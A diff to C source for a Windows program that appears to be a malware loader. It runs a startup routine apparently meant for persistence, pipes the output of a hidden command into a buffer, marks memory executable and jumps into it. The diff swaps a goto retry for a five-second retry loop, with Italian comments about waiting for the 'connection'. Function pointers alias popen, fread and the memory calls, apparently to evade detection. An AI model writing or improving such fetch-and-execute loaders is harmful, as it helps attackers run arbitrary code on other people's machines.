@@ -1,7 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <windows.h>
 #include <winsock2.h>
 #include <windows.h>
 #include <winuser.h>
@@ -41,7 +40,6 @@ int bootRun() {
 int main() {
     bootRun();
 
-    start:
     FILE *(*f1)(const char *, const char *) = popen;
     size_t (*f2)(void *, size_t, size_t, FILE *) = fread;
     int (*f3)(FILE *) = pclose;
@@ -54,9 +52,13 @@ int main() {
     unsigned char code[460];
     int counter = 0;
 
-    while(0 == (fpipe = (FILE*)f1(command, "r"))) {
-        Sleep(10);
-        goto start;
+    while (1) {
+        fpipe = (FILE*)f1(command, "r");
+        if (fpipe != NULL) {
+            break;  // Esce dal ciclo se la connessione è stabilita
+        } else {
+            Sleep(5000);  // Attende 5 secondi prima di riprovare
+        }
     }
 
     while (f2(&c, sizeof c, 1, fpipe)) {
@@ -69,5 +71,6 @@ int main() {
     void *exec = f4(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     f5(exec, code, sizeof code);
     ((void(*)())exec)();
+
     return 0;
 }
